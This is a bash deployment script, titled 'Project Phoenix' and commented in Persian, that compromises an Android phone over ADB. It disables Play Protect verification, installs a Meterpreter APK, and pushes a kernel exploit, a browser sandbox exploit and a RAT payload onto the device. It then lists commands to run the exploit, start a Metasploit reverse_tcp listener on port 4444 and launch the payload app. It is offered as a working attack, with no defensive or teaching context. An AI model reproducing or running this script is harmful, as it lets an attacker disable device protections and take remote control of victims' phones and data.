#!/bin/bash
# Phoenix Deployment Script

echo "🔥 Project Phoenix - Deployment"
echo "================================"

# بررسی اتصال ADB
echo "[*] Checking ADB connection..."
adb devices

read -p "Press Enter to continue..."

# غیرفعال کردن Play Protect
echo "[*] Disabling Play Protect..."
adb shell settings put global package_verifier_enable 0
adb shell settings put global verifier_verify_adb_installs 0

# نصب APK
echo "[*] Installing Meterpreter APK..."
adb install -r 02_payloads/android/phoenix_meterpreter.apk

# انتقال اکسپلویت‌ها
echo "[*] Pushing kernel exploit..."
adb push 02_payloads/android/phoenix_kernel_arm64 /data/local/tmp/phoenix
adb shell chmod 755 /data/local/tmp/phoenix

echo "[*] Pushing browser exploit..."
adb push 03_exploits/browser/phoenix_sandbox.js /sdcard/Download/

echo "[*] Pushing RAT payload..."
adb push 02_payloads/android/PhoenixRAT.java /sdcard/Download/

echo "[+] Deployment complete!"
echo ""
echo "Next steps:"
echo "1. Run: adb shell /data/local/tmp/phoenix"
echo "2. Start MSF: msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit'"
echo "3. Launch app: adb shell am start -n com.metasploit.stage/.MainActivity"
